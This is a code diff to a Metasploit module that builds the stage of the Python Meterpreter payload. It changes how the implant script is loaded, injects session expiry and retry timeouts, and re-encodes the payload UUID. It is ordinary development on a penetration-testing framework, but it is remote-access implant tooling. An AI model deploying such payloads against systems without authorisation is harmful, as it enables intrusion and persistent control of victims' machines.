@@ -22,24 +22,25 @@ module Metasploit3
       'Session'       => Msf::Sessions::Meterpreter_Python_Python
     ))
     register_advanced_options([
-      OptBool.new('PythonMeterpreterDebug', [ true, "Enable debugging for the Python meterpreter", false ])
+      OptBool.new('PythonMeterpreterDebug', [ true, 'Enable debugging for the Python meterpreter', false ])
     ], self.class)
   end
 
   def generate_stage(opts={})
-    file = ::File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.py")
-
-    met = ::File.open(file, "rb") {|f|
-      f.read(f.stat.size)
-    }
+    met = MetasploitPayloads.read('meterpreter', 'meterpreter.py')
 
     if datastore['PythonMeterpreterDebug']
       met = met.sub("DEBUGGING = False", "DEBUGGING = True")
     end
 
+    met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
+    met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
+    met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{datastore['SessionRetryTotal']}")
+    met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{datastore['SessionRetryWait']}")
+
     uuid = opts[:uuid] || generate_payload_uuid
-    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
-    met = met.sub("PAYLOAD_UUID = \"\"", "PAYLOAD_UUID = \"#{bytes}\"")
+    uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
+    met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")
 
     met
   end
